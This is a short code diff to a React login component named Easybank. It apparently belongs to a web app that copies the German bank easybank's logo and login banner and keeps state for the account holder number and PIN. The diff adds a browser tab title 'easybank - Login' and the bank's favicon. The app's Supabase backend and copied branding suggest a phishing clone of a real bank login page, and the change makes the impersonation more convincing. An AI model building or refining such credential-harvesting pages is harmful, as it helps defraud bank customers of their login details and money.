@@ -2,9 +2,11 @@ import { useState, useEffect, useRef, useCallback } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
 import { Eye, ChevronRight, ChevronDown } from "lucide-react";
 import easybankLogo from "@/assets/logo-easybank_de.png";
 import easybankBanner from "@/assets/EASY26016_login.jpg";
+import easybankIcon from "@/assets/easy_bank.png";
 
 type Lang = "DE" | "EN";
 
@@ -115,6 +117,7 @@ const Easybank = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("easybank - Login", easybankIcon);
 
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
